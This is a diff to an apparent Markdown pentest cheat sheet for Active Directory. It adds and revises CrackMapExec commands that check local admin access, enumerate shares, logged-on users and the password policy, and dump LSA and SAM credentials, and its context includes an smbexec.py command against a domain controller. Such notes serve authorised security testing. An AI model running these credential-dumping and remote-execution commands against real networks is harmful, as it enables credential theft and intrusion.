@@ -201,31 +201,41 @@ python smbexec.py <domain>/Administrator@<computername dc> -k -no-pass
 ```
 
 ## Crackmapexec
+#### Use crackmapexec / Check local admin access
+```
+cme smb -d <domain> <ip> -u <username> -p <password> 
+```
+
+#### Check local admin access with local account
+```
+cme smb <ip> -u <username> -p <password> --local-auth
+cme smb <ip> -d . -u <username> -p <password>
+```
+
 #### Get the password policy
 ```
-cme smb <ip> -u <username> -p <password> --pas-pol
+cme smb -d <domain> <ip> -u <username> -p <password> --pas-pol
 ```
 
 #### List the shares
 ```
-cme smb <ip> -u <username> -p <password> --shares
+cme smb -d <domain> <ip> -u <username> -p <password> --shares
 ```
 
 #### List the loggedonusers
 ```
-cme smb <ip> -u <username> -p <password> --loggedon-users
+cme smb -d <domain> <ip> -u <username> -p <password> --loggedon-users
 ```
 
 #### Dump credentials LSA
 ```
-cme smb <ip> -u <username> -p <password> --lsa
+cme smb -d <domain> <ip> -u <username> -p <password> --lsa
 ```
 
 #### Dump credentials sam
 ```
-cme smb <ip> -u <username> -p <password> --sam
+cme smb -d <domain> <ip> -u <username> -p <password> --sam
 ```
-
 
 #### Cat .cme.conf to change workspace and other configurations
 ```
